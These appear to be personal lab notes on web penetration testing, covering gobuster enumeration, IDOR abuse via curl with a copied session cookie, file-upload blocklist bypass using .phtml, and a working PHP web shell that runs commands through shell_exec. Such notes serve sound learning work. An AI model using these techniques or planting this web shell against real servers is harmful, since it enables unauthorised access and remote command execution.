## gobuster is a way to check the directories and stuff

`gobuster dir -u http://10.48.172.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php`

here we use a specific file using `-w /filepath` and `-x php` for the extension 
It prints out different parts of a website with the level of authentication in terms of *status code* 

## api endpoint check 
`curl http://website_address/api/` here if a website has */api.php* from gobuster then we can easily check its endpoints 
we can find internal API routes from this 

# Insecure Direct Object Reference (IDOR)
is a flaw when the web-app ties user identification to only one blatantly obvious parameter. like the no. of account which was created. so anyone can change the url and change `...?id=1/id=2` and access the second and first account.

`curl -s -b "PHPSESSID=gs5ngd6duukc09agpdnj1o9tt2" "http://MACHINE_IP/profile.php?id=1" | grep "fw-semibold"`
	here `-s` means silent mode, i.e. only output is presented
	and `-b` means a cookie string is to be passed
		and the PHPSESSID is the cookie value we copied from `storage` of our logged-in user
	and finally the machine_ip with user_id
	`grep "fw-semibold` is a CSS utility, it tells grep to only display the info dev wanted to dispaly and not the useless code. 
# php code execution 
majority of the times only specific types of files will allowed to be uploaded. 
> the server may use a blocklist.
> which blocks specific extensions 
> this is an issue as uncommon extensions can be missed out 
> 	like php can be blocked 
> 	but phtml might not be 
> 	and we can make a phtml file, upload it as run a php command

---

# Web shell 
A web shell is a small script that accepts commands through HTTP parameters and executes them on the server. Let's create a simple one and save it as `shell.phtml`
```<?php 
	if(isset($_GET['cmd']))
		{ echo "< pre>"  .  shell_exec($_GET['cmd']) . "</ pre>"; 
	} 
	?>```